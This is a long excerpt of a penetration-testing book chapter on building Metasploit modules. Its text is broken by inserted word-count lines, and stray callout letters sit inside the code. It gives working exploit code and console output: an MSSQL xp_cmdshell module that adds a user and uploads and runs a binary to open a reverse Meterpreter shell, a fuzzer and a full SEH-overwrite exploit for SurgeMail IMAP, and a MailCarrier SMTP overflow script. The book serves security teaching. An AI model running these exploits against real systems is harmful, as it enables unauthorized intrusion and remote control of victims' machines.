msf auxiliary(mssql_exec) > exploit
[Word Count: 32]

[*] SQL Query: EXEC master..xp_cmdshell 'net user metasploit p@55w0rd /ADD'
[Word Count: 10]

output
 ------
\ The command completed successfully.
[Word Count: 7]

[*] Auxiliary module execution completed
msf auxiliary(mssql_exec) >
[Word Count: 8]

Now we’ll examine what is actually occurring “under the hood” of the module 
we just worked with, mssql_exec. This allows us to get a feel for how existing 
code is operating before we write our own. Let’s open the module with a text 
editor to see how it operates:
[Word Count: 49]

root@bt:/opt/framework3/msf3# nano modules/auxiliary/admin/mssql/mssql_exec.rb
[Word Count: 3]

The following lines excerpted from the module yield a few important 
things worthy of note:
[Word Count: 15]

def run
[mssql_xpcmdshell(datastore['CMD'], true) 
if mssql_login_datastore
        end
[Word Count: 7]

root@bt:/opt/framework3/msf3# nano lib/msf/core/exploit/mssql.rb
root@bt:/opt/framework3/msf3# nano lib/msf/core/exploit/mssql_commands.rb
[Word Count: 6]

Press CTRL-W in Nano to search for mssql_xpcmdshell in mssql.rb, and you 
should find the definition that tells Metasploit how to use the xp_cmdshell pro-
cedure, as shown next:
[Word Count: 29]

#
        # Execute a system command via xp_cmdshell
        #
        def mssql_xpcmdshell(cmd,doprint=false,opts={})
                force_enable = false
                begin
                        res = mssql_query("EXEC master..xp_cmdshellX '#{cmd}'Y", false, opts)
[Word Count: 22]

This listing defines the SQL query to be run against the server as a call 
to the xp_cmdshell stored procedure at X and a variable that will be replaced 
with the command line the user requests to be executed at Y. For instance, 
an attempt to add a user to the system would execute within MS SQL as EXEC 
master..xp_cmdshell 'net user metasploit p@55w0rd! /ADD' by setting the cmd vari-
able to 'net user metasploit p@55w0rd! /ADD'. 
Now turn your attention to the mssql_commands.rb, where the commands 
to enable the xp_cmdshell procedure live:
[Word Count: 93]

# Re-enable the xp_cmdshell stored procedure in 2005 and 2008
def mssql_xpcmdshell_enable(opts={});
"exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec 
master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"X
[Word Count: 20]

Here you can see the sequence of commands X issued to re-enable the 
xp_cmdshell stored procedure in MS SQL Server 2005 and 2008.
Now that you understand the functions we will be using in creating our 
own module, let’s get started.
[Word Count: 41]

root@bt:/opt/framework3/msf3# cp modules/exploits/windows/mssql/mssql_payload.rb
[Word Count: 3]

modules/exploits/windows/mssql/mssql_powershell.rb
[Word Count: 1]

Next, we open the mssql_powershell.rb file we just created and modify its 
code so that it looks just like the following. This is an exploit base shell. Take 
some time to review the various parameters and remember the topics covered 
in the previous chapters.
[Word Count: 44]

require 'msf/core' # require core libraries
[Word Count: 6]

class Metasploit3 < Msf::Exploit::Remote # define this as a remote exploit
     Rank = ExcellentRanking # reliable exploit ranking
[Word Count: 18]

include Msf::Exploit::Remote::MSSQL # include the mssql.rb library
[Word Count: 7]

def initialize(info = {}) # initialize the basic template
Xsuper(update_info(info,
               'Name'           => 'Microsoft SQL Server PowerShell Payload',
               'Description'    => %q{
                         This module will deliver our payload through Microsoft PowerShell 
using MSSQL based attack vectors.
               },
               'Author'         => [ 'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>'],
               'License'        => MSF_LICENSE,
               'Version'        => '$Revision: 8771 $',
               'References'     =>
                    [
                         [ 'URL', 'http://www.secmaniac.com' ]
                    ],
Y'Platform'       => 'win', # target only windows
               'Targets'        =>
                    [
                         [ 'Automatic', { } ], # automatic targeting
                    ],
Z'DefaultTarget'  => 0
               ))
          register_options( # register options for the user to pick from
               [
[Word Count: 92]

[OptBool.new('UsePowerShell',[ false, "Use PowerShell as payload delivery 
method instead", true]), # default to PowerShell
               ])
     end
[Word Count: 16]

def exploit # define our exploit here; it does nothing at this point
[Word Count: 13]

\handler # call the Metasploit handler
          disconnect # after handler disconnect
     end  
end
[Word Count: 13]

Before this exploit will work properly, you’ll need to define some basic 
settings. Notice that the name, description, licensing, and references are 
defined at X. We also define a platform at Y (Windows) and a target at Z 
(all operating systems). We also define a new parameter called UsePowerShell 
at [ for use in the body of the exploit. Lastly, a handler is specified at \ to 
handle the connections between the attacker and the exploited target.
[Word Count: 77]

With the skeleton of the exploit built, we run it through msfconsole to see what 
options are available:
[Word Count: 18]

msf > use windows/mssql/mssql_powershell
msf exploit(mssql_powershell) > show options
[Word Count: 9]

Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   PASSWORD                        no        The password for the specified username
   RHOST                           yes       The target address
   RPORT          1433             yes       The target port
   USERNAME       sa               no        The username to authenticate as
   UsePowerShell  true             no        Use PowerShell as payload delivery method instead
[Word Count: 46]

# if u/n and p/w didn't work throw error
Xif(not mssql_login_datastore)
Yprint_status("Invalid SQL Server credentials")
               return
          end
[Word Count: 17]

# Use powershell method for payload delivery
Zif (datastore['UsePowerShell'])
[Word Count: 9]

[powershell_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))
[Word Count: 1]

end
            handler
            disconnect
     end
end
[Word Count: 5]

The module first checks to see if we are logged in at X. If we aren’t logged 
in, the error message "Invalid SQL Server Credentials" Y is displayed. The 
UsePowerShell method at Z is used to call the function powershell_upload_exec [, 
which will automatically create a Metasploit-based payload that we specify
[Word Count: 51]

during our exploit. After we finally run the exploit, when we specify our 
payload in msfconsole, it will automatically generate it for us based on the 
Msf::Util::EXE.to_win32pe(framework,payload.encoded) option.
[Word Count: 28]

Now we’ll open the mssql.rb file that we opened earlier, in preparation for 
editing. We need to find space for the powershell_upload_exec function.
[Word Count: 23]

root@bt:/opt/framework3/msf3# nano lib/msf/core/exploit/mssql.rb
[Word Count: 3]

In your version of Metasploit, you can do a search for PowerShell, and 
you should see the referenced code that follows in the mssql.rb file. Feel free 
to delete this code from the file and start from scratch.
[Word Count: 38]

#
     # Upload and execute a Windows binary through MS SQL queries and PowerShell
     #
Xdef powershell_upload_exec(exe, debug=false)
[Word Count: 18]

# hex converter
Yhex = exe.unpack("H*")[0] 
          # create random alpha 8 character names
Zvar_payload = rand_text_alpha(8) 
[print_status("Warning: This module will leave #{var_payload}.exe in the SQL
[Word Count: 25]

The following listing shows the conversion from hexadecimal back to binary, 
written in PowerShell. The code is defined as a string to be called later and 
uploaded to the target machine.
[Word Count: 31]

# Our payload converter grabs a hex file and converts it to binary through PowerShell
[Word Count: 15]

X h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s = [string]::Join('', $s);$s= Y$s. 
Replace('`r',''); $s = $s.Replace(''`n','');$b = new-object byte[] $($s.Length/
2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};
[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
[Word Count: 25]

# base64 encoding allows us to perform execution through powershell without registry changes
[ h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
[Word Count: 17]

\ print_status("Uploading the payload #{var_payload}, please be patient...")
[Word Count: 8]

At Z, the string was converted to Unicode; this is a requirement to have 
the arguments and information passed to PowerShell. The h2b_encoded = 
Rex::Text.encoded_base64(h2b_unicode) is then passed to convert it to a Base64-
encoded string to be passed through MS SQL. Base64 is the encoding required 
to leverage the –EncodedCommand flag. We first converted our string to Unicode, 
and then to Base64, which is the format we need for all of our PowerShell 
commands. Finally, at \ a message stating that we are in the process of 
uploading the payload is printed to the console.
[Word Count: 96]

Counters help you track your location in a file or keep track of how much 
data the program has read in. In the next example, a base counter called idx 
starts at 0. The counter is used to identify the end of the file and move up 500 
bytes at a time when the hexadecimal-based binary is being sent to the oper-
ating system. Essentially, the counter is saying, “Read 500 bytes, and then 
send. Read another 500 bytes, and then send,” until it reaches the end of 
the file.
[Word Count: 90]

X idx=0 
Y cnt = 500 
Z while(idx < hex.length - 1) 
mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\#{var_payload}", false) 
idx += cnt 
end
[ print_status("Converting the payload utilizing PowerShell EncodedCommand...")
mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug) 
mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
print_status("Executing the payload...")
mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
print_status("Be sure to cleanup #{var_payload}.exe...")
end
[Word Count: 51]

The following shows the entire mssql.rb file:
[Word Count: 7]

#
# Upload and execute a Windows binary through MSSQL queries and Powershell
#
def powershell_upload_exec(exe, debug=false)
[Word Count: 17]

With our work on mssql_powershell.rb and mssql.rb complete, we can run the 
exploit through Metasploit and msfconsole. But before we do, we need to 
make sure that PowerShell is installed. Then we can run the following com-
mands to execute our newly created exploit:
[Word Count: 44]

msf > use windows/mssql/mssql_powershell
msf exploit(mssql_powershell) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(mssql_powershell) > set LHOST 172.16.32.129
LHOST => 172.16.32.129
msf exploit(mssql_powershell) > set RHOST 172.16.32.136
[Word Count: 28]

RHOST => 172.16.32.136
msf exploit(mssql_powershell) > exploit
[Word Count: 7]

[*] Started reverse handler on 172.16.32.129:4444
[*] Warning: This module will leave CztBAnfG.exe in the SQL Server %TEMP% directory
[*] Uploading the payload CztBAnfG, please be patient...
[*] Converting the payload utilizing PowerShell EncodedCommand...
[*] Executing the payload...
[*] Sending stage (748032 bytes) to 172.16.32.136
[*] Be sure to cleanup CztBAnfG.exe...
[*] Meterpreter session 1 opened (172.16.32.129:4444 -> 172.16.32.136:49164) at 2010-05-17 
16:12:19 -0400
[Word Count: 63]

C R E A T I N G  Y O U R  O W N  E X P L O I T S
[Word Count: 23]

As a penetration tester, you will frequently encounter 
applications for which no Metasploit modules are avail-
able. In such situations, you can attempt to uncover 
vulnerabilities in the application and develop your own 
exploits for them.
[Word Count: 36]

NOTE
This chapter assumes that you are familiar with exploit development and comfortable 
with the concept of buffer overflows and the use of a debugger. If you need a bit of a 
refresher, you’ll find some excellent tutorials by corelanc0d3r on the Exploit Database 
site, http://www.exploit-db.com/. At a minimum, consider reading “Exploit 
Writing Tutorial Part 1: Stack Based Overflows” (http://www.exploit-db.com/
download_pdf/13535/) and “Exploit Writing Tutorial Part 3: SEH” (http://
www.exploit-db.com/download_pdf/13537/).
[Word Count: 70]

Before you develop any exploit, you need to determine whether a vulnerabil-
ity exists in the application. This is where fuzzing comes into play.
The following listing shows the code for a simple Internet Message Access 
Protocol (IMAP) fuzzer. Save this to your /root/.msf3/modules/auxiliary/fuzzers/ 
directory, but be sure to keep your testing modules in a folder separate from 
the main Metasploit trunk.
[Word Count: 62]

res = raw_send_recv(req)
                                if !res.nil?
                        print_status(res)
                                else
                print_status("Server crashed, no response")
                                        break
                                end
                        disconnect()
                end
        end
end
[Word Count: 17]

msf > use auxiliary/fuzzers/imap_fuzz
msf auxiliary(imap_fuzz) > show options
[Word Count: 9]

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   IMAPPASS                   no        The password for the specified username
   IMAPUSER                   no        The username to authenticate as
   RHOST                      yes       The target address
   RPORT     143              yes       The target port
[Word Count: 35]

msf auxiliary(imap_fuzz) > set IMAPPASS test
IMAPPASS => test
msf auxiliary(imap_fuzz) > set IMAPUSER test
IMAPUSER => test
msf auxiliary(imap_fuzz) > set RHOST 192.168.1.155
RHOST => 192.168.1.155
msf auxiliary(imap_fuzz) >
[Word Count: 30]

The fuzzer should now be ready to go. Make sure that your debugger of 
choice (we’re using the Immunity Debugger in our examples) is attached to 
the surgemail.exe process, and start the fuzzer:
[Word Count: 33]

X [*] Authenticating as test with password test...
[*] Generating fuzzed data...
Y [*] Sending fuzzed data, buffer length = 684
Z [*] 0002 LIST () "/v1AD7DnJTVykXGYYM6BmnXuYRlZNIJUzQzFPvASjYxzdTTOngBJ5gfK0XjLy3ciAAk1Fmo0
RPEpq6f4BBnp5jm3LuSbAOj1M5qULEGEv0DMk0oOPUj6XPN1VwxFpjAfFeAxykiwdDiqNwnVJAKyr6X7C5ije7
DSujURybOp6BkKWroLCzQg2AmTuqz48oNeY9CDeirNwoITfIaC40Ds9OgEDtL8WN5tL4QYdVuZQ85219Thogk7
75GVfNH4YPpSo2PLmvd5Bf2sY9YDSvDqMmjW9FXrgLoUK2rl9cvoCbTZX1zuU1dDjnJJpXDuaysDfJKbtHn9Vh
siiYhFokALiF1QI9BRwj4bo0kwZDn8jyedxhSRdU9CFlMs19CvbVnnLWeRGHScrTxpduVJZygbJcrRp6AWQqke
Y0DzI4bd7uXgTIHXN6R403ALckZgqOWcUSEWj6THI9NFAIPP1LEnctaK0uxbzjpS1ize16r388StXBGq1we7Qa
8j6xqJsN5GmnIN4HQ4W4PZIjGRHUZC8Q4ytXYEksxXe2ZUhl5Xbdhz13zW2HpxJ2AT4kRU1wDqBUkEQwvKtoeb
rfUGJ8bvjTMSxKihrDMk6BxAnY6kjFGDi5o8hcEag4tzJ1FhH9eI2UHDVbsDmUHTfAFbreJTHVlcIruAozmZKz
i7XgTaOgzGh" "PWNED"
[Word Count: 36]

[*] Authenticating as test with password test...
[*] Generating fuzzed data...
[*] Sending fuzzed data, buffer length = 1007
[*] 0002 LIST () "/FzwJjIcL16vW4PXDPpJbpsHB4p7Xts9fbaJYjRJASXRqbZnOMzprZfVZH7BYvcHuwlN0Yq
yfoCrJyobzOqoscJeTeRgrDQKA8MDDLbmY6WCQ6XQH9Wkj4c9JCfPjIqTndsocWBz1xLMX1VdsutJEtnceHvhl
Gqee6Djh7v3oJW4tXJMMxe8uR2NgBlKoCbH18VTR8GUFqWCmQ0970B3gR9foi6inKdWdcE6ivbOHElAiYkFYzZ
06Q5dvza58DVhn8sqSnRAmq1UlcUGuvr6r99POlrZst10r606J2B03TBGDFuy0dNMI0EUANKZ6OnCn3Zk1JL65
9MC8PZy0frCiPBqZ4xn0biAjFTH5LsCjIFuI5eZ9LsdXdek7iiOhEmW6D86mAtyg9S1a7RALrbRcLIHJpwMsEE
5LS1wIV9aFPS6RQwI4DtF4bGSle1FCyf63hy3Vo8AKkId6yu5MfjwfUExandVeUldk8c5bhlyqoDp3UX2ClQPZ
os0KpFoIcxmq8R0E3Ri54l5Yl3OPcN7U20Kb1CEAfbhxGFgh1oMzjJpuM7IbHMrZNjVADz6A0byzgiP2pXa7Zm
OloV9u6Fwa0l6sR6oL0Png9MYNwTMXTUdiE7rOjuOmkdgglPTkZ3n4de1FEaLh8Xhf9SNSPZUX0M7gmUiyNYv6
qti3Omy8qvjJOQui1IhUhf5fKOunKIcB5Zw7quznxV1GF2R5hXVTw1vlbMi5TQW68ZDFlD6q6BJ4S3oNrFCyXX
aQpAURyCoDGdjoxk1vrUPGusf3i4EIF2iqyyekWiQ7GuYcwMax3o0ZXB2djFh2dYEGyBSCHaFhpwUgamThinnM
AsDFuEY9Hq9UOQSmZ6ySunifPFjCbDs4Zooquw0HPaVnbNVo97tfVBYSei9dWCUWwUAPVJVsTGoDNRVarOrg8q
wbziv8aQaPZ7Y8r0SUiB1nNhlhl3UCVZpf8Gck0psjETf4ks356q0I3mLZkqCLkznVV4ayetVgaDm" "PWNED"
[Word Count: 36]

\ [*] Server crashed, no response
[*] Auxiliary module execution completed
msf auxiliary(imap_fuzz) >
[Word Count: 14]

even longer string of 11,000 bytes, you can overwrite the Structured Excep-
tion Handler (SEH). Controlling the SEH makes the exploit more reliable, 
because it makes it more versatile. Similarly, the use of an application DLL 
for a return address makes the exploit portable across different operating sys-
tem versions.
[Word Count: 50]

Figure 14-1: The debugger pauses at the point of the crash.
[Word Count: 11]

To send the 11,000-byte string, we make a small change in the fuzzer 
code, as shown here:
[Word Count: 17]

print_status("Generating fuzzed data...")
 fuzzed = "A" * 11000
  print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
  req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
[Word Count: 30]

Rather than using the random string of characters, this code modifica-
tion sends a string of 11,000 As as part of the malicious request.
[Word Count: 24]

Controlling the Structured Exception Handler
[Word Count: 5]

If you restart the surgemail service, reattach the debugger to the process, 
and rerun the module, you should see the crash that fuzzing found in your 
debugger. If you’re using the Immunity Debugger, you should be able to see 
the contents of the SEH chain by selecting ViewSEH chain. Right-click the 
value, which should be 41414141, and select Follow address in stack to dis-
play the stack contents leading to the SEH overwrite in the lower-right pane 
shown in Figure 14-2.
[Word Count: 81]

Now that you know that you can control the SEH chain on the vulner-
able surgemail process with an overly long buffer, it’s time to determine the 
exact length required to overwrite it on the target. As you will recall from 
our discussions of stand-alone exploit development, before you can use a 
return address, you first need to find out where, exactly, the overwrite 
occurs.
We can modify our fuzzer code to create a nonrepeating, random string 
of characters of a specific length, as shown next:
[Word Count: 86]

print_status("Generating fuzzed data...")
  fuzzed = Rex::Text.pattern_create(11000)
  print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
  req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
[Word Count: 28]

In this listing, we use Rex::Text.pattern_create to generate the nonrepeat-
ing random string of characters with our fuzzer. Rerunning the fuzzer module 
now shows that SEH was overwritten on the target with 684E3368, as shown 
in Figure 14-3.
[Word Count: 38]

Figure 14-3: The SEH overwritten with random 
characters
[Word Count: 8]

With the SEH overwritten with our random set of characters, we can use 
pattern_offset.rb in /opt/metasploit3/msf3/tools/ to determine exactly where the 
overwrite occurs by passing the characters of interest (684E3368) followed by 
the length of the string that was sent to the target (11000), as shown here:
[Word Count: 47]

root@bt:~/.msf3/modules/auxiliary/fuzzers# /opt/metasploit3/msf3/tools/pattern_offset.rb 
684E3368 11000
10360
[Word Count: 5]

The value 10360 means that the four bytes that overwrite SEH are 10361, 
10362, 10363, and 10364. We can now change the fuzzer code one last time 
to verify our findings:
[Word Count: 31]

print_status("Generating fuzzed data...")
 fuzzed = "\x41" * 10360 fuzzed << "\x42" * 4 fuzzed << "\x43" * 636
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
[Word Count: 27]

As shown, the fuzzer will build the malicious request beginning with 
10,360 As (hexadecimal 41), followed by four Bs (hexadecimal 42) to over-
write the SEH, and then 636 Cs (hexadecimal 43) as filler to keep the string 
length constant at 11,000 bytes.
Running the fuzzer against the target again shows that the entire SEH 
chain is under your complete control, as shown in Figure 14-4.
[Word Count: 66]

[Buffer of garbage | NOP Slide | Shellcode | Near Jump | Short Jump | POP-POP-RETN]
[Word Count: 16]

To ensure portability of the exploit across different versions of Windows, 
use a return address from an application DLL or executable. In this case, 
only the application executable itself is available, so you can try to accom-
plish a three-byte overwrite of SEH using a POP-POP-RETN sequence of 
instructions from the surgemail.exe file. If this can be done successfully, the 
exploit will be universal across versions of Windows.
Let’s move on to creating the actual exploit for the SurgeMail vulnerability. 
Following is our initial skeleton exploit module to be saved in /root/.msf3/
modules/exploits/windows/imap/:
[Word Count: 93]

class Metasploit3 < Msf::Exploit::Remote
[Word Count: 4]

def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',
            'Description'    => %q{
                This module exploits a stack overflow in the Surgemail IMAP Server
                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP
                account credentials are required.
            },
            'Author'         => [ 'ryujin' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 1 $',
[Word Count: 56]

'References'     =>
                [
                    [ 'BID', '28260' ],
                    [ 'CVE', '2008-1498' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/5259' ],
                ],
            'Privileged'     => false,
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload'        =>
                {
X'Space'       => 10351,
                    'DisableNops' => true,
                    'BadChars'    => "\x00"
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
Y[ 'Windows Universal', { 'Ret' => 0xDEADBEEF } ], # p/p/r TBD
                ],
            'DisclosureDate' => 'March 13 2008',
            'DefaultTarget' => 0))
    end
[Word Count: 67]

def exploit
Zconnected = connect_login
[lead = "\x41" * 10360
\evil = lead + "\x43" * 4
        print_status("Sending payload")
]sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
^sock.put(sploit)
        handler
        disconnect
    end
[Word Count: 36]

The 'Space' declaration at X refers to the space available for shellcode. 
This declaration is very important in an exploit module because it deter-
mines which payloads Metasploit will allow you to use when running your 
exploit. Some payloads require much more space than others, so try not to 
overstate this value. Payload sizes vary greatly and encoding increases their 
sizes. To see the size of an unencoded payload, you would use the info com-
mand followed by the name of the payload and look for the Total size value, 
as shown here:
[Word Count: 93]

msf > info payload/windows/shell_bind_tcp
[Word Count: 4]

Name: Windows Command Shell, Bind TCP Inline
     Module: payload/windows/shell_bind_tcp
    Version: 8642
[Word Count: 11]

Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 341
       Rank: Normal
[Word Count: 12]

The return address at Y in the 'Targets' section is currently occupied by a 
placeholder value, which we’ll change later in the exploit development process.
As with the fuzzer module discussed earlier, this exploit connects and 
logs into the target at Z, uses a string of As at [ as the initial buffer, and 
appends four Cs at \ to overwrite the SEH. The entire exploit string is gen-
erated at ] and then sent to the target at ^.
[Word Count: 80]

The next step is to locate a POP-POP-RETN sequence in surgemail.exe. To do 
so, copy the executable to a location on your Back|Track machine, and then 
use the -p switch with msfpescan to locate a suitable candidate, as in the follow-
ing example:
[Word Count: 43]

root@bt:/tmp# msfpescan -p surgemail.exe
[Word Count: 4]

[surgemail.exe]
0x0042e947 pop esi; pop ebp; ret
0x0042f88b pop esi; pop ebp; ret
0x00458e68 pop esi; pop ebp; ret
0x00458edb pop esi; pop ebp; ret
0x0046754d pop esi; pop ebp; ret
0x00467578 pop esi; pop ebp; ret
0x0046d204 pop eax; pop ebp; ret
[Word Count: 43]

0x0078506e pop ebx; pop ebp; ret
0x00785105 pop ecx; pop ebx; ret
0x0078517e pop esi; pop ebx; ret
[Word Count: 18]

'Platform'       => 'win',
            'Targets'        =>
                [
X[ 'Windows Universal', { 'Ret' => "\x7e\x51\x78" } ], # p/p/r in surgemail.exe
                ],
            'DisclosureDate' => 'March 13 2008',
            'DefaultTarget' => 0))
    end
[Word Count: 29]

def exploit
        connected = connect_login
        lead = "\x41" * 10360
Yevil = lead + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
[Word Count: 30]

msf > use exploit/windows/imap/surgemail_book
msf exploit(surgemail_book) > set IMAPPASS test
IMAPPASS => test
msf exploit(surgemail_book) > set IMAPUSER test
IMAPUSER => test
msf exploit(surgemail_book) > set RHOST 192.168.1.155
RHOST => 192.168.1.155
X msf exploit(surgemail_book) > set PAYLOAD generic/debug_trap
PAYLOAD => generic/debug_trap
msf exploit(surgemail_book) > exploit
[Word Count: 45]

[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) >
[Word Count: 21]

Figure 14-5: Landing in the POP-POP-RETN instructions
[Word Count: 7]

Next, edit the exploit to include the instructions for the short jump back-
ward, as shown here:
[Word Count: 17]

def exploit
connected = connect_login
Xlead = "\x41" * 10356
Ynseh = "\xeb\xf9\x90\x90"
evil = lead + nseh + [target.ret].pack("A3")
print_status("Sending payload")
sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
sock.put(sploit)
handler
disconnect
end
[Word Count: 39]

Now all you have to do is replace the buffer of 41s with NOPs (\x90) to 
give yourself a nice NOP slide to land in, and then you can sit back and let 
Metasploit take care of the shellcode.
[Word Count: 39]

def exploit
        connected = connect_login
Xlead = "\x90" * (10351 - payload.encoded.length)
Ynear = "\xe9\xdd\xd7\xff\xff"
        nseh = "\xeb\xf9\x90\x90"
[Word Count: 18]

Zevil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
        sock.put(sploit)
        handler
        disconnect
end
[Word Count: 30]

msf exploit(surgemail_book) > set payload windows/shell_bind_tcp
payload => windows/shell_bind_tcp
[Word Count: 9]

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) >
[Word Count: 25]

Bad Characters and Remote Code Execution
[Word Count: 6]

mangled and marking that character as bad. One of the fastest methods, 
however, is to find the bad characters in the source code of similar exploits. 
For example, a search of the IMAP exploits as of this writing finds \x00\x09\
x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b listed as bad characters, as shown next:
[Word Count: 48]

'Privileged'     => false,
'DefaultOptions' =>
{
'EXITFUNC' => 'thread',
},
'Payload'        =>
{
'Space'       => 10351,
'DisableNops' => true,
'BadChars'    => "\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b"
},
'Platform'       => 'win',
'Targets'        =>
[Word Count: 28]

When you declare 'BadChars' in an exploit module, Metasploit will auto-
matically exclude them from shellcode and from any automatically generated 
strings of text or NOPs.
When we run the exploit again, as shown next, after declaring bad char-
acters, we finally get a session on the third try. The exploit still isn’t reliable, 
but it works because Metasploit dynamically changes the shellcode each time 
the exploit is run. As a result, the characters that are causing the module to 
fail may not always be present.
[Word Count: 86]

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) > rexploit
[Word Count: 26]

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) > rexploit
[Word Count: 26]

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Command shell session 1 opened (192.168.1.101:59501 -> 192.168.1.155:4444)
[Word Count: 23]

Determining the remaining bad characters is an exercise left for the 
reader. An excellent, albeit tedious, way to eliminate all bad characters is 
to follow the technique described at http://en.wikibooks.org/wiki/Metasploit/
WritingWindowsExploit#Dealing_with_badchars.
The current exploit code, including all of the pieces we’ve added, is 
shown here:
[Word Count: 45]

class Metasploit3 < Msf::Exploit::Remote
[Word Count: 4]

def exploit
        connected = connect_login
        lead = "\x90" * (10351 - payload.encoded.length)
        near = "\xe9\xdd\xd7\xff\xff"
        nseh = "\xeb\xf9\x90\x90"
        evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
        sock.put(sploit)
        handler
        disconnect
    end
[Word Count: 48]

P O R T I N G  E X P L O I T S  T O  T H E  
M E T A S P L O I T  F R A M E W O R K
[Word Count: 39]

You can choose to convert exploits to Metasploit from 
a different format for many reasons, not the least of 
which is to give back to the community and the Frame-
work. Not all exploits are based on the Metasploit Frame-
work; some are programmed in Perl and Python or C 
and C++.
[Word Count: 52]

To get the most out of this chapter, you’ll need a basic understanding of the 
assembly programming language. We use a lot of low-level assembly language 
instructions and commands in this chapter, so let’s take a look at the most 
common ones.
[Word Count: 42]

The JMP instruction set is the “jump” to the ESP memory address. In the over-
flow example that we’ll explore in this chapter, we use the JMP ESP instruction 
set to tell the computer to go to the ESP memory address that happens to 
contain our shellcode.
[Word Count: 47]

A NOP is a no-operation instruction. Sometimes when you trigger an over-
flow, you won’t know exactly where you’re going to land within the space allo-
cated. A NOP instruction simply says to the computer “Don’t do anything if 
you see me,” and it is represented by a \x90 in hexadecimal. 
A NOP slide is a handful of NOPs, combined to create a slide to our 
shellcode. When we go through and actually trigger the JMP ESP instructions, 
we will hit a bunch of NOPs, which will slide down until we hit our shellcode.
[Word Count: 94]

Our first example is a typical remote buffer overflow that needs only a jump 
to the extended stack pointer (JMP ESP) instruction to reach the shellcode. 
This exploit, called the “MailCarrier 2.51 SMTP EHLO / HELO Buffer Over-
flow Exploit,” uses MailCarrier 2.51 SMTP commands to cause a buffer 
overflow.
[Word Count: 50]

NOTE
You’ll find the exploit and a vulnerable application at http://www.exploit-db.com/
exploits/598/.
[Word Count: 12]

Porting Exploits to the Metasploit Framework
217
[Word Count: 7]

#!/usr/bin/python
#########################################################
# MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow     #
# Advanced, secure and easy to use Mail Server. 
#
# 23 Oct 2004 - muts                                    #
#########################################################
[Word Count: 30]

print "\n\n###############################################"
print "\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow"
print "\nFound & coded by muts [at] whitehat.co.il"
print "\nFor Educational Purposes Only!\n"
print "\n\n###############################################"
[Word Count: 26]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
[Word Count: 4]

buffer = "\x41" * 5093
buffer += "\42" * 4
buffer += "\x90" * 32
buffer += "\xcc" * 1000
[Word Count: 20]

try:
    print "\nSending evil buffer..."
    s.connect(('192.168.1.155',25))
    s.send('EHLO ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect to SMTP!"
[Word Count: 25]

As you might imagine, the easiest and fastest way to port a stand-alone 
exploit to Metasploit is to modify a similar one from the Framework. And 
that’s what we’ll do next.
[Word Count: 31]

As our first step in porting the MailCarrier exploit, we’ll strip down the exist-
ing Metasploit module to a simple skeleton file, as shown here:
[Word Count: 25]

class Metasploit3 < Msf::Exploit::Remote
        Rank = GoodRanking
Xinclude Msf::Exploit::Remote::Tcp
[Word Count: 9]

Porting Exploits to the Metasploit Framework
219
[Word Count: 7]

handler
              disconnect
       end
[Word Count: 3]

Because this exploit does not require authentication, we need only the 
mixin Msf::Exploit::Remote::Tcp shown at X. We’ve discussed mixins in previ-
ous chapters; you’ll recall that mixins allow you to use built-in protocols such 
as Remote::Tcp to perform basic remote TCP communications. 
In the preceding listing, the target return address is set to the bogus value 
Oxdeadbeef at Y, and the default TCP port is set to 25 at Z. Upon connecting 
to the target, Metasploit will send the malicious attack using sock.put as shown 
at [ and craft our exploit for us.
[Word Count: 93]

